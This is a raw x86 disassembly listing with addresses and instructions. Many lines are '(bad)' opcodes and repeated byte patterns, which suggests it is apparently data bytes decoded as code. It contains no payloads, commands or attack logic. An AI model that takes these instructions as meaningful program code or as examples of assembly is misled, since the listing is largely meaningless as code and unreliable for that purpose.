1101052c:	repnz mov fs,WORD PTR [ecx+0x0]
11010530:	hlt    
11010531:	mov    fs,WORD PTR [ecx+0x0]
11010534:	lock (bad) 
11010536:	fs add ah,dh
11010539:	nop
1101053a:	arpl   WORD PTR [eax],ax
1101053c:	repnz xchg ecx,eax
1101053e:	data16 add ah,dh
11010541:	xchg   edx,eax
11010542:	gs add cl,dh
11010545:	xchg   edx,eax
11010546:	push   0x6893f400
1101054b:	add    bl,dh
1101054d:	xchg   esp,eax
1101054e:	imul   eax,DWORD PTR [eax],0x6a95f4
11010554:	hlt    
11010555:	xchg   esi,eax
11010556:	ins    BYTE PTR es:[edi],dx
11010557:	add    ah,dh
11010559:	cwde   
1101055a:	outs   dx,BYTE PTR ds:[esi]
1101055b:	add    ah,dh
1101055d:	call   0x73:0x9cf50071
11010564:	cmc    
11010565:	popf   
11010566:	jne    0x11010568
11010568:	neg    BYTE PTR [edi-0x5e0aff88]
1101056e:	jnp    0x11010570
11010570:	cmc    
11010571:	mov    ds:0xa4f6007c,al
11010576:	jle    0x11010578
11010578:	jmp    0xf1018a1c
1101057d:	popf   
1101057e:	mov    DWORD PTR [eax],eax
11010580:	mul    BYTE PTR [ebp-0x5609ff7f]
11010586:	xchg   BYTE PTR [eax],al
11010588:	imul   BYTE PTR [ebx-0x5108ff78]
1101058e:	lea    eax,[eax]
11010590:	div    DWORD PTR [ecx-0x4b08ff6f]
11010596:	xchg   esi,eax
11010597:	add    al,bh
11010599:	mov    dh,0x98
1101059b:	add    bh,dh
1101059d:	mov    eax,0xb9f8009b
110105a2:	sahf   
110105a3:	add    bh,dh
110105a5:	mov    ebx,0xbcf700a1
110105aa:	mov    ds:0xa0bbf800,al
110105af:	add    al,bh
110105b1:	mov    ebp,0xbef900a2
110105b6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
110105b7:	add    cl,bh
110105b9:	shl    BYTE PTR [edi-0x543c0800],0x0
110105c0:	stc    
110105c1:	les    ebp,FWORD PTR [ebp-0x46391300]
110105c7:	add    cl,bh
110105c9:	(bad)  
110105ca:	mov    al,0x0
110105cc:	stc    
110105cd:	enter  0xb2,0xf9
110105d1:	leave  
110105d2:	mov    ah,0x0
110105d4:	stc    
110105d5:	int    0xb8
110105d7:	add    dl,bh
110105d9:	sar    BYTE PTR [esi-0x3f310c00],1
110105df:	add    dl,bh
110105e1:	rol    ecx,cl
110105e3:	add    cl,bh
110105e5:	aad    0xc5
110105e7:	add    bl,bh
110105e9:	fxch   st(1)
110105eb:	add    bl,bh
110105ed:	fcmove st,st(4)
110105ef:	add    bl,bh
110105f1:	fmul   st(5),st
110105f3:	add    ah,bh
110105f5:	loop   0x110105cd
110105f7:	add    ah,bh
110105f9:	call   0xafd06dd
110105fe:	test   DWORD PTR [eax],0xfafafa
11010604:	std    
11010605:	cli    
11010606:	stc    
11010607:	add    ah,bh
11010609:	cld    
1101060a:	sti    
1101060b:	add    ch,bh
1101060d:	std    
1101060e:	std    
1101060f:	add    BYTE PTR [eax+0x22],dl
11010612:	add    BYTE PTR [eax],al
11010614:	jo     0x11010646
11010616:	add    BYTE PTR [eax],al
11010618:	nop
11010619:	add    BYTE PTR ds:[eax],al
1101061c:	mov    al,0x4d
1101061e:	add    BYTE PTR [eax],al
11010620:	iret   
11010621:	pop    ebx
11010622:	add    BYTE PTR [eax],al
11010624:	lock imul eax,DWORD PTR [eax],0x1179ff00
1101062b:	add    bh,bh
1101062d:	mov    dh,BYTE PTR [ecx]
1101062f:	add    bh,bh
11010631:	popf   
11010632:	push   ecx
11010633:	add    bh,bh
11010635:	scas   eax,DWORD PTR es:[edi]
11010636:	jno    0x11010638
11010638:	inc    ecx
1101063a:	xchg   ecx,eax
1101063b:	add    bh,bh
1101063d:	shl    BYTE PTR [ecx-0x2e1a0100],cl
11010643:	add    bh,bh
11010645:	(bad)  
11010646:	inc    DWORD PTR [eax]
11010648:	add    BYTE PTR [eax],al
1101064a:	add    BYTE PTR [eax],al
1101064c:	das    
1101064d:	add    eax,DWORD PTR [eax]
1101064f:	add    BYTE PTR [eax+0x4],dl
11010652:	add    BYTE PTR [eax],al
11010654:	jo     0x1101065c
11010656:	add    BYTE PTR [eax],al
11010658:	nop
11010659:	or     DWORD PTR [eax],eax
1101065b:	add    BYTE PTR [eax-0x30fffff6],dh
11010661:	or     al,0x0
11010663:	add    al,dh
11010665:	push   cs
11010666:	add    BYTE PTR [eax],al
11010668:	jmp    DWORD PTR [eax]
1101066a:	adc    al,BYTE PTR [eax]
1101066c:	(bad)  
1101066d:	xor    DWORD PTR ds:[eax],eax
11010670:	call   FWORD PTR [ecx+edx*2+0x0]
11010674:	(bad)  
11010675:	jp     0x110106e8
11010677:	add    bh,bh
11010679:	xchg   edi,eax
1101067a:	xchg   ecx,eax
1101067b:	add    bh,bh
1101067d:	mov    dh,0xb1
1101067f:	add    bh,bh
11010681:	aam    0xd1
11010683:	add    bh,bh
11010685:	(bad)  
11010686:	inc    DWORD PTR [eax]
11010688:	add    BYTE PTR [eax],al
1101068a:	add    BYTE PTR [eax],al
1101068c:	das    
1101068d:	add    BYTE PTR [esi],cl
1101068f:	add    BYTE PTR [eax+0x0],dl
11010692:	pop    ss
11010693:	add    BYTE PTR [eax+0x0],dh
11010696:	and    DWORD PTR [eax],eax
11010698:	nop
11010699:	add    BYTE PTR [ebx],ch
1101069b:	add    BYTE PTR [eax-0x30ffca00],dh
110106a1:	add    BYTE PTR [eax+0x0],al
110106a4:	lock add BYTE PTR [ecx+0x0],cl
110106a8:	call   DWORD PTR [ecx]
110106aa:	pop    edx
110106ab:	add    bh,bh
110106ad:	xor    DWORD PTR [eax+0x0],esi
110106b0:	call   DWORD PTR [ecx-0x7a]
110106b3:	add    bh,bh
110106b5:	jno    0x11010653
110106b7:	add    bh,bh
110106b9:	xchg   ecx,eax
110106ba:	mov    dl,0x0
110106bc:	push   DWORD PTR [ecx-0x2e00ff38]
110106c2:	fild   WORD PTR [eax]
110106c4:	(bad)  
110106c5:	(bad)  
110106c6:	inc    DWORD PTR [eax]
110106c8:	add    BYTE PTR [eax],al
110106ca:	add    BYTE PTR [eax],al
110106cc:	das    
110106cd:	add    BYTE PTR [eax],ah
110106cf:	add    BYTE PTR [eax+0x0],dl
110106d2:	add    BYTE PTR ss:[eax+0x0],dh
110106d6:	dec    esp
110106d7:	add    BYTE PTR [eax-0x4fff9e00],dl
110106dd:	add    BYTE PTR [eax+0x0],bh
110106e0:	iret   
110106e1:	add    BYTE PTR [esi-0x5bff1000],cl
110106e7:	add    bh,bh
110106e9:	adc    DWORD PTR [ebx-0x41ce0100],esi
110106ef:	add    bh,bh
110106f1:	push   ecx
110106f2:	mov    DWORD PTR [eax],0xd171ff
110106f8:	call   DWORD PTR [ecx-0x4e00ff24]
110106fe:	in     eax,0x0
11010700:	call   ecx
11010702:	lock add bh,bh
11010705:	(bad)  
11010706:	inc    DWORD PTR [eax]
11010708:	add    BYTE PTR [eax],al
1101070a:	add    BYTE PTR [eax],al
1101070c:	sub    al,0x0
1101070e:	das    
1101070f:	add    BYTE PTR [ebx+0x0],cl
11010712:	push   eax
11010713:	add    BYTE PTR [ecx+0x0],ch
11010716:	jo     0x11010718
11010718:	xchg   DWORD PTR [eax],eax
1101071a:	nop
1101071b:	add    BYTE PTR [ebp-0x3bff5000],ah
11010721:	add    bh,cl
11010723:	add    cl,ah
11010725:	add    al,dh
11010727:	add    al,dh
11010729:	adc    edi,edi
1101072b:	add    dl,dh
1101072d:	xor    edi,edi
1101072f:	add    ah,dh
11010731:	push   ecx
11010732:	inc    DWORD PTR [eax]
11010734:	div    BYTE PTR [ecx-0x1]
11010737:	add    bh,dh
11010739:	xchg   ecx,eax
1101073a:	inc    DWORD PTR [eax]
1101073c:	stc    
1101073d:	mov    cl,0xff
1101073f:	add    bl,bh
11010741:	sar    edi,1
11010743:	add    bh,bh
11010745:	(bad)  
11010746:	inc    DWORD PTR [eax]
11010748:	add    BYTE PTR [eax],al
1101074a:	add    BYTE PTR [eax],al
1101074c:	sbb    eax,DWORD PTR [eax]
1101074e:	das    
1101074f:	add    BYTE PTR ds:0x3f005000,ch
11010755:	add    BYTE PTR [eax+0x0],dh
11010758:	push   edx
11010759:	add    BYTE PTR [eax-0x4fff9d00],dl
1101075f:	add    BYTE PTR [esi+0x0],dh
11010762:	iret   
11010763:	add    BYTE PTR [eax-0x66ff1000],cl
11010769:	adc    edi,edi
1101076b:	add    BYTE PTR [esi-0x4bff00cf],ah
11010771:	push   ecx
11010772:	inc    DWORD PTR [eax]
11010774:	ret    0xff71
11010777:	add    bh,cl
11010779:	xchg   ecx,eax
1101077a:	inc    DWORD PTR [eax]
1101077c:	fdiv   QWORD PTR [ecx-0x2e14ff01]
11010782:	inc    DWORD PTR [eax]
11010784:	(bad)  
11010785:	(bad)  
11010786:	inc    DWORD PTR [eax]
11010788:	add    BYTE PTR [eax],al
1101078a:	add    BYTE PTR [eax],al
1101078c:	or     BYTE PTR [eax],al
1101078e:	das    
1101078f:	add    BYTE PTR [esi],cl
11010791:	add    BYTE PTR [eax+0x0],dl
11010794:	adc    eax,0x1b007000
11010799:	add    BYTE PTR [eax-0x4fffdf00],dl
1101079f:	add    BYTE PTR [esi],ah
110107a1:	add    bh,cl
110107a3:	add    BYTE PTR [eax+eax*1],ch
110107a6:	lock add BYTE PTR [esi],bh
110107a9:	adc    edi,edi
110107ab:	add    BYTE PTR [eax+0x31],bl
110107ae:	inc    DWORD PTR [eax]
110107b0:	jno    0x11010803
110107b2:	inc    DWORD PTR [eax]
110107b4:	mov    WORD PTR [ecx-0x1],?
110107b7:	add    BYTE PTR [esi-0x40ff006f],ah
110107bd:	mov    cl,0xff
110107bf:	add    dl,bl
110107c1:	sar    edi,1
110107c3:	add    bh,bh
110107c5:	(bad)  
110107c6:	inc    DWORD PTR [eax]
	...
11010800:	add    BYTE PTR [eax],al
11010802:	add    BYTE PTR [ecx],al
	...
11010828:	add    BYTE PTR [eax],al
1101082a:	add    DWORD PTR [eax],esp
1101082c:	pop    ds
1101082d:	add    DWORD PTR [eax],eax
	...
1101084f:	add    BYTE PTR [eax],al
11010851:	add    DWORD PTR [eax],esp
11010853:	nop
11010854:	mov    ds,WORD PTR [edi]
	...
11010876:	add    BYTE PTR [eax],al
11010878:	add    BYTE PTR [eax],ah
1101087a:	nop
1101087b:	xchg   ecx,eax
1101087c:	xchg   ecx,eax
1101087d:	nop
1101087e:	pop    ds
	...
1101089f:	add    BYTE PTR [eax],ah
110108a1:	nop
110108a2:	xchg   ecx,eax
110108a3:	xchg   ecx,eax
110108a4:	xchg   ecx,eax
110108a5:	xchg   ecx,eax
110108a6:	nop
110108a7:	pop    ds
	...
110108bc:	add    BYTE PTR [eax],al
110108be:	and    al,0x35
110108c0:	xor    ebp,DWORD PTR [eax]
110108c2:	and    eax,0x61014
110108c7:	and    BYTE PTR [esi-0x6e606e61],cl
110108cd:	lahf   
110108ce:	lahf   
110108cf:	(bad)  
110108d0:	pop    ds
110108d1:	add    BYTE PTR ds:0x28251510,al
110108d7:	xor    esi,DWORD PTR ds:0x24
	...
110108e5:	add    BYTE PTR ds:0x26364650,dh
110108eb:	adc    ecx,DWORD PTR [ecx]
110108ed:	add    BYTE PTR [eax],ah
110108ef:	nop
110108f0:	xchg   ecx,eax
110108f1:	xchg   ecx,eax
110108f2:	lahf   
110108f3:	xchg   ecx,eax
110108f4:	xchg   ecx,eax
110108f5:	lahf   
110108f6:	lahf   
110108f7:	xchg   ecx,eax
110108f8:	nop
110108f9:	pop    ds
110108fa:	add    BYTE PTR [ecx],cl
110108fc:	adc    esp,DWORD PTR [esi]
110108fe:	ss dec eax
11010900:	push   edx
11010901:	xor    eax,0x0
	...
1101090e:	xor    eax,DWORD PTR [esi+0x36]
11010911:	adc    ecx,DWORD PTR es:[ecx]
11010914:	add    BYTE PTR [eax],ah
11010916:	nop
11010917:	xchg   ecx,eax
11010918:	lahf   
11010919:	xchg   ecx,eax
1101091a:	xchg   ecx,eax
1101091b:	lahf   
1101091c:	xchg   ecx,eax
1101091d:	lahf   
1101091e:	lahf   
1101091f:	lahf   
11010920:	xchg   ecx,eax
11010921:	nop
11010922:	pop    ds
11010923:	add    DWORD PTR [ecx],ecx
11010925:	adc    esp,DWORD PTR [esi]
11010927:	ss dec eax
11010929:	xor    eax,DWORD PTR [eax]
	...
11010933:	add    BYTE PTR [eax],al
11010935:	add    BYTE PTR [eax],ch
11010937:	ss adc ecx,DWORD PTR es:[ecx]
1101093b:	add    BYTE PTR [eax],ah
1101093d:	nop
1101093e:	xchg   ecx,eax
1101093f:	xchg   ecx,eax
11010940:	lahf   
11010941:	xchg   ecx,eax
11010942:	xchg   ecx,eax
11010943:	xchg   ecx,eax
11010944:	xchg   ecx,eax
11010945:	xchg   ecx,eax
11010946:	xchg   ecx,eax
11010947:	xchg   ecx,eax
11010948:	xchg   ecx,eax
11010949:	xchg   ecx,eax
1101094a:	mov    ds,WORD PTR [edi]
1101094c:	add    BYTE PTR [ecx],cl
1101094e:	adc    esp,DWORD PTR [esi]
11010950:	sub    BYTE PTR ss:[eax],al
	...
1101095b:	add    BYTE PTR [eax],al
1101095d:	add    BYTE PTR ds:0x91326,ah
11010963:	and    BYTE PTR [eax-0x7a706e61],dl
11010969:	ins    BYTE PTR es:[edi],dx
1101096a:	aas    
1101096b:	cmp    dh,BYTE PTR [edi]
1101096d:	ds push esi
1101096f:	jg     0x110108fe
11010971:	lahf   
11010972:	xchg   ecx,eax
11010973:	nop
11010974:	pop    ds
11010975:	add    BYTE PTR [ecx],cl
11010977:	adc    esp,DWORD PTR [esi]
11010979:	and    eax,0x0
	...
11010986:	adc    al,0x13
11010988:	or     DWORD PTR [ecx],eax
1101098a:	and    BYTE PTR [eax+0x57879f9f],dl
11010990:	inc    edx
11010991:	cmp    eax,0x2f303139
11010996:	sub    eax,0x9f7f3c2c
1101099b:	lahf   
1101099c:	nop
1101099d:	pop    ds
1101099e:	add    BYTE PTR [ecx],cl
110109a0:	adc    edx,DWORD PTR ds:0x0
	...
110109ae:	adc    BYTE PTR [ecx],cl
110109b0:	add    BYTE PTR [eax],ah
110109b2:	nop
110109b3:	lahf   
110109b4:	xchg   ecx,eax
110109b5:	ja     0x11010a03
110109b7:	dec    edx
110109b8:	inc    ebp
110109b9:	inc    edx
110109ba:	inc    ecx
110109bb:	cmp    edi,DWORD PTR [eax]
110109bd:	xor    BYTE PTR [edi],ch
110109bf:	sub    eax,0x916d2b2c
110109c4:	xchg   ecx,eax
110109c5:	nop
110109c6:	and    BYTE PTR [eax],al
110109c8:	or     DWORD PTR [eax],edx
	...
110109d6:	push   es
110109d7:	add    BYTE PTR [eax],ah
110109d9:	nop
110109da:	lahf   
110109db:	xchg   ecx,eax
110109dc:	jnp    0x11010a31
110109de:	push   edx
110109df:	dec    esp
110109e0:	dec    ebx
110109e1:	inc    ebp
110109e2:	inc    ebx
110109e3:	inc    ecx
110109e4:	cmp    edi,DWORD PTR [eax]
110109e6:	xor    BYTE PTR [edi],ch
110109e8:	sub    eax,0x916d2a2c
110109ed:	xchg   ecx,eax
110109ee:	nop
110109ef:	pop    ds
110109f0:	add    BYTE PTR [esi],al
	...
110109fe:	add    BYTE PTR [eax],ah
11010a00:	nop
11010a01:	xchg   ecx,eax
11010a02:	lahf   
11010a03:	mov    BYTE PTR [ebp+0x55],dl
11010a06:	push   ebp
11010a07:	push   esp
11010a08:	push   eax
11010a09:	dec    ebx
11010a0a:	inc    edi
11010a0b:	inc    esp
11010a0c:	inc    ecx
11010a0d:	cmp    edi,DWORD PTR [eax]
11010a0f:	aaa    
11010a10:	das    
11010a11:	sub    eax,0x9f7f2b2c
11010a16:	xchg   ecx,eax
11010a17:	nop
11010a18:	pop    ds
	...
11010a25:	add    BYTE PTR [eax],ah
11010a27:	nop
11010a28:	xchg   ecx,eax
11010a29:	xchg   ecx,eax
11010a2a:	nop
11010a2b:	pop    dx
11010a2d:	pop    edx
11010a2e:	pop    esp
11010a2f:	pop    edx
11010a30:	push   ebp
11010a31:	push   eax
11010a32:	dec    esi
11010a33:	inc    edi
11010a34:	inc    ebp
11010a35:	inc    ecx
11010a36:	cmp    eax,0x2d2f303a
11010a3b:	sub    al,0x3c
11010a3d:	lea    edx,[ecx+0x1f9091]
	...
11010a4b:	add    BYTE PTR [ecx],al
11010a4d:	and    BYTE PTR [eax-0x77606e61],dl
11010a53:	pop    edx
11010a54:	pop    esi
11010a55:	pop    esi
11010a56:	pusha  
11010a57:	pusha  
11010a58:	pusha  
11010a59:	pop    ecx
11010a5a:	push   ecx
11010a5b:	dec    esi
11010a5c:	dec    ecx
11010a5d:	inc    esp
11010a5e:	inc    ecx
11010a5f:	cmp    eax,0x2d2f3138
11010a64:	sub    al,0x7f
11010a66:	xchg   ecx,eax
11010a67:	lahf   
11010a68:	lahf   
11010a69:	mov    ds,WORD PTR [edi]
11010a6b:	add    DWORD PTR [eax],eax
11010a6d:	add    BYTE PTR [eax],al
11010a6f:	add    BYTE PTR [eax],al
11010a71:	add    BYTE PTR [eax],al
11010a73:	add    DWORD PTR [eax],esp
11010a75:	nop
11010a76:	xchg   ecx,eax
11010a77:	lahf   
11010a78:	lahf   
11010a79:	lahf   
11010a7a:	je     0x11010ada
11010a7c:	bound  esp,QWORD PTR [esp+eiz*2+0x64]
11010a80:	bound  ebx,QWORD PTR fs:[ebp+0x51]
11010a84:	dec    edi
11010a85:	dec    ebx
11010a86:	inc    esp
11010a87:	inc    edx
11010a88:	cmp    eax,0x2d2f3038
11010a8d:	push   esi
11010a8e:	lahf   
11010a8f:	xchg   ecx,eax
11010a90:	lahf   
11010a91:	xchg   ecx,eax
11010a92:	nop
11010a93:	pop    ds
11010a94:	add    BYTE PTR [eax],al
11010a96:	add    BYTE PTR [eax],al
11010a98:	add    BYTE PTR [eax],al
11010a9a:	add    DWORD PTR [eax],esp
11010a9c:	nop
11010a9d:	lahf   
11010a9e:	lahf   
11010a9f:	lahf   
11010aa0:	lahf   
11010aa1:	lahf   
11010aa2:	push   0x63
11010aa4:	addr16 pushw 0x6768
11010aa9:	fs pop bp
11010aac:	pop    eax
11010aad:	dec    edi
11010aae:	dec    ecx
11010aaf:	inc    esp
11010ab0:	inc    ecx
11010ab1:	cmp    edi,DWORD PTR [eax]
11010ab3:	xor    BYTE PTR [esi],ch
11010ab5:	ds xchg ecx,eax
11010ab7:	lahf   
11010ab8:	lahf   
11010ab9:	lahf   
11010aba:	xchg   ecx,eax
11010abb:	nop
11010abc:	pop    ds
11010abd:	add    DWORD PTR [eax],eax
11010abf:	add    BYTE PTR [eax],al
11010ac1:	add    esp,DWORD PTR [eax]
11010ac3:	nop
11010ac4:	xchg   ecx,eax
11010ac5:	xchg   ecx,eax
11010ac6:	xchg   ecx,eax
11010ac7:	xchg   ecx,eax
11010ac8:	xchg   ecx,eax
11010ac9:	xchg   ecx,eax
11010aca:	addr16 pushw 0x6e
11010ace:	outs   dx,BYTE PTR ds:[esi]
11010acf:	outs   dx,BYTE PTR ds:[esi]
11010ad0:	imul   ebp,DWORD PTR [ecx+0x67],0x65
11010ad4:	pop    edi
11010ad5:	pop    eax
11010ad6:	dec    edi
11010ad7:	dec    ecx
11010ad8:	inc    esp
11010ad9:	inc    ecx
11010ada:	cmp    edi,DWORD PTR [eax]
11010adc:	xor    BYTE PTR [edi],dh
11010ade:	xchg   ecx,eax
11010adf:	lahf   
11010ae0:	xchg   ecx,eax
11010ae1:	xchg   ecx,eax
11010ae2:	xchg   ecx,eax
11010ae3:	xchg   ecx,eax
11010ae4:	mov    ds,WORD PTR [edi]
11010ae6:	add    eax,DWORD PTR [eax]
11010ae8:	add    BYTE PTR [eax+eiz*1],al
11010aeb:	nop
11010aec:	xchg   ecx,eax
11010aed:	lahf   
11010aee:	xchg   ecx,eax
11010aef:	lahf   
11010af0:	lahf   
11010af1:	lahf   
11010af2:	push   0x7272706b
11010af7:	jb     0x11010b6a
11010af9:	jo     0x11010b66
11010afb:	push   0x4e515d65
11010b00:	inc    edi
11010b01:	inc    ebp
11010b02:	inc    ecx
11010b03:	cmp    esi,DWORD PTR [ecx]
11010b05:	cmp    dl,BYTE PTR [ecx-0x6e606e61]
11010b0b:	xchg   ecx,eax
11010b0c:	nop
11010b0d:	and    BYTE PTR [eax+eax*1],al
11010b10:	add    BYTE PTR [eax],al
11010b12:	add    al,0x20
11010b14:	nop
11010b15:	xchg   ecx,eax
11010b16:	xchg   ecx,eax
11010b17:	lahf   
11010b18:	xchg   ecx,eax
11010b19:	xchg   ecx,eax
11010b1a:	jno    0x11010b8c
11010b1c:	jae    0x11010b97
11010b1e:	jp     0x11010b99
11010b20:	jbe    0x11010b94
11010b22:	jo     0x11010b8f
11010b24:	push   0x4e515b63
11010b29:	inc    edi
11010b2a:	inc    ebx
11010b2b:	inc    eax
11010b2c:	cmp    DWORD PTR [edi],edi
11010b2e:	xchg   ecx,eax
11010b2f:	lahf   
11010b30:	xchg   ecx,eax
11010b31:	lahf   
11010b32:	xchg   ecx,eax
11010b33:	nop
11010b34:	and    BYTE PTR [eax+eax*1],al
11010b37:	add    BYTE PTR [eax],al
11010b39:	add    BYTE PTR [eax],al
11010b3b:	add    al,0x20
11010b3d:	xchg   ecx,eax
11010b3e:	xchg   ecx,eax
11010b3f:	lahf   
11010b40:	xchg   ecx,eax
11010b41:	lahf   
11010b42:	jle    0x11010bb6
11010b44:	jnp    0x11010ac6
11010b46:	add    BYTE PTR [ecx+0x6f72797d],0x69
11010b4d:	gs popa 
11010b4f:	pop    ecx
11010b50:	push   eax
11010b51:	dec    ebx
11010b52:	inc    edi
11010b53:	inc    edx
11010b54:	cmp    eax,0x919f916c
11010b59:	lahf   
11010b5a:	nop
11010b5b:	and    BYTE PTR [ebx],al
11010b5d:	add    BYTE PTR [eax],al
11010b5f:	add    BYTE PTR [eax],al
11010b61:	add    BYTE PTR [eax],al
11010b63:	add    BYTE PTR [eax+eiz*1],al
11010b66:	nop
11010b67:	xchg   ecx,eax
11010b68:	lahf   
11010b69:	xchg   ecx,eax
11010b6a:	mov    esi,DWORD PTR [eax+eax*4-0x7c]
11010b6e:	xchg   DWORD PTR [esi+0x71767d83],eax
11010b74:	outs   dx,BYTE PTR ds:[esi]
11010b75:	addr16 fs pop esi
11010b78:	push   ebp
11010b79:	push   eax
11010b7a:	dec    esp
11010b7b:	inc    ebp
11010b7c:	inc    edx
11010b7d:	test   DWORD PTR [ecx+0x2090919f],edx
11010b83:	add    DWORD PTR [eax],eax
	...
11010b8d:	add    BYTE PTR [eax],ah
11010b8f:	xchg   ecx,eax
11010b90:	xchg   ecx,eax
11010b91:	lahf   
11010b92:	nop
11010b93:	jl     0x11010b15
11010b95:	mov    BYTE PTR [edx+0x7b818689],cl
11010b9b:	jb     0x11010c0b
11010b9d:	push   0x545c6064
11010ba2:	push   eax
11010ba3:	dec    edx
11010ba4:	push   edi
11010ba5:	(bad)  
11010ba6:	xchg   ecx,eax
11010ba7:	xchg   ecx,eax
11010ba8:	nop
11010ba9:	and    BYTE PTR [eax],al
	...
11010bb7:	and    BYTE PTR [eax+0x7e8c9f91],dl
11010bbd:	xchg   BYTE PTR [edx+0x7b82878a],cl
11010bc3:	jb     0x11010c33
11010bc5:	push   0x555c6064
11010bca:	push   eax
11010bcb:	dec    esp
11010bcc:	xchg   DWORD PTR [edi+0x209091],ebx
	...
11010bde:	adc    eax,0x9f902002
11010be3:	lahf   
11010be4:	mov    al,BYTE PTR [edx-0x7f7b787a]
11010bea:	jns    0x11010c5d
11010bec:	outs   dx,BYTE PTR ds:[esi]
11010bed:	addr16 fs pop esi
11010bf0:	pop    esp
11010bf1:	push   ebp
11010bf2:	push   ebp
11010bf3:	js     0x11010b86
11010bf5:	lahf   
11010bf6:	nop
11010bf7:	and    BYTE PTR [edx],al
11010bf9:	push   ss
	...
11010c06:	xor    ch,BYTE PTR [ecx]
11010c08:	add    ah,BYTE PTR [eax]
11010c0a:	xchg   ecx,eax
11010c0b:	lahf   
11010c0c:	xchg   ecx,eax
11010c0d:	mov    bh,BYTE PTR [esi-0x7f]
11010c10:	jle    0x11010c8d
11010c12:	jae    0x11010c84
11010c14:	push   0x65
11010c16:	bound  ebx,QWORD PTR [edx+ebx*2+0x55]
11010c1a:	jnp    0x11010bac
11010c1c:	lahf   
11010c1d:	nop
11010c1e:	and    BYTE PTR [edx],al
11010c20:	sub    DWORD PTR [edx],esi
	...
11010c2e:	xor    al,0x4d
11010c30:	sub    DWORD PTR [edx],eax
11010c32:	and    BYTE PTR [eax+0x7c8c9f91],dl
11010c38:	je     0x11010cac
11010c3a:	outs   dx,DWORD PTR ds:[esi]
11010c3b:	imul   esp,DWORD PTR [esi+0x63],0x5e
11010c3f:	pop    edx
11010c40:	mov    WORD PTR [ecx+0x2209091],dx
11010c47:	sub    DWORD PTR [ebp+0x34],ecx
	...
11010c56:	xor    eax,0x2284d52
11010c5b:	and    BYTE PTR [ecx-0x7470606f],dl
11010c61:	jle    0x11010cd4
11010c63:	push   0x88746a66
11010c68:	(bad)  
11010c69:	xchg   ecx,eax
11010c6a:	xchg   ecx,eax
11010c6b:	nop
11010c6c:	and    BYTE PTR [edx],al
11010c6e:	sub    DWORD PTR [ebp+0x52],ecx
11010c71:	xor    eax,0x0
	...
11010c7e:	xor    eax,0x284d5253
11010c83:	add    ah,BYTE PTR [eax]
11010c85:	nop
11010c86:	lahf   
11010c87:	xchg   ecx,eax
11010c88:	xchg   ecx,eax
11010c89:	lahf   
11010c8a:	xchg   ecx,eax
11010c8b:	xchg   ecx,eax
11010c8c:	xchg   ecx,eax
11010c8d:	lahf   
11010c8e:	lahf   
11010c8f:	xchg   ecx,eax
11010c90:	xchg   ecx,eax
11010c91:	xchg   ecx,eax
11010c92:	nop
11010c93:	and    BYTE PTR [edx],al
11010c95:	sub    DWORD PTR [ebp+0x52],ecx
11010c98:	push   ebx
11010c99:	xor    eax,0x0
	...
11010ca6:	xor    eax,0x4d525353
11010cab:	sub    BYTE PTR [edx],al
11010cad:	and    BYTE PTR [eax-0x606e606f],dl
11010cb3:	xchg   ecx,eax
11010cb4:	xchg   ecx,eax
11010cb5:	lahf   
11010cb6:	xchg   ecx,eax
11010cb7:	lahf   
11010cb8:	xchg   ecx,eax
11010cb9:	nop
11010cba:	and    BYTE PTR [edx],al
11010cbc:	sub    DWORD PTR [ebp+0x52],ecx
11010cbf:	push   ebx
11010cc0:	push   ebx
11010cc1:	xor    eax,0x0
	...
11010cce:	xor    eax,0x52525353
11010cd3:	dec    ebp
11010cd4:	sub    BYTE PTR [edx],al
11010cd6:	and    BYTE PTR [eax-0x606e606f],dl
11010cdc:	xchg   ecx,eax
11010cdd:	lahf   
11010cde:	lahf   
11010cdf:	xchg   ecx,eax
11010ce0:	nop
11010ce1:	and    BYTE PTR [edx],al
11010ce3:	sub    DWORD PTR [ebp+0x52],ecx
11010ce6:	push   ebx
11010ce7:	push   edx
11010ce8:	push   edx
11010ce9:	xor    eax,0x0
	...
11010cf6:	and    al,0x35
11010cf8:	xor    eax,0x32343535
11010cfd:	adc    eax,0x91902000
11010d02:	xchg   ecx,eax
11010d03:	xchg   ecx,eax
11010d04:	xchg   ecx,eax
11010d05:	lahf   
11010d06:	xchg   ecx,eax
11010d07:	nop
11010d08:	and    BYTE PTR [eax],al
11010d0a:	push   ss
11010d0b:	xor    dh,BYTE PTR [esi*1+0x24353535]
	...
11010d26:	add    BYTE PTR [eax],al
11010d28:	and    BYTE PTR [ecx-0x6e6e6e6f],dl
11010d2e:	nop
11010d2f:	and    BYTE PTR [eax],al
	...
11010d4d:	add    BYTE PTR [eax],al
11010d4f:	add    BYTE PTR [eax+eiz*1],al
11010d52:	nop
11010d53:	xchg   ecx,eax
11010d54:	xchg   ecx,eax
11010d55:	nop
11010d56:	and    BYTE PTR [eax+eax*1],al
	...
11010d79:	add    al,0x20
11010d7b:	nop
11010d7c:	nop
11010d7d:	and    BYTE PTR [eax+eax*1],al
	...
11010da0:	add    BYTE PTR [eax],al
11010da2:	add    al,0x20
11010da4:	and    BYTE PTR [eax+eax*1],al
	...
11010dcb:	add    al,0x7
	...
11010e05:	add    BYTE PTR [eax],al
11010e07:	add    bh,bh
11010e09:	(bad)  
11010e0a:	(bad)  
11010e0b:	(bad)  
11010e0c:	(bad)  
11010e0d:	inc    DWORD PTR [eax]
11010e0f:	push   cs
11010e10:	(bad)  
11010e11:	jmp    edi
11010e13:	(bad)  
11010e14:	(bad)  
11010e15:	inc    DWORD PTR [eax]
11010e17:	push   cs
11010e18:	(bad)  
11010e19:	inc    ebx
11010e1b:	(bad)  
11010e1c:	(bad)  
11010e1d:	inc    DWORD PTR [eax]
11010e1f:	push   cs
11010e20:	(bad)  
11010e21:	inc    DWORD PTR [ecx+0xffffff]
11010e27:	push   cs
11010e28:	(bad)  
11010e29:	inc    DWORD PTR [eax]
11010e2b:	(bad)  
11010e2c:	(bad)  
11010e2d:	inc    DWORD PTR [eax]
11010e2f:	push   cs
11010e30:	clc    
11010e31:	add    BYTE PTR [eax],al
11010e33:	add    BYTE PTR [edi],bl
11010e35:	inc    DWORD PTR [eax]
11010e37:	push   cs
11010e38:	clc    
11010e39:	add    BYTE PTR [eax],al
11010e3b:	add    BYTE PTR [edi],bl
11010e3d:	inc    DWORD PTR [eax]
11010e3f:	push   cs
11010e40:	clc    
11010e41:	add    BYTE PTR [eax],al
11010e43:	add    BYTE PTR [edi],bl
11010e45:	inc    DWORD PTR [eax]
11010e47:	push   cs
11010e48:	clc    
11010e49:	add    BYTE PTR [eax],al
11010e4b:	add    BYTE PTR [edi],bl
11010e4d:	inc    DWORD PTR [eax]
11010e4f:	push   cs
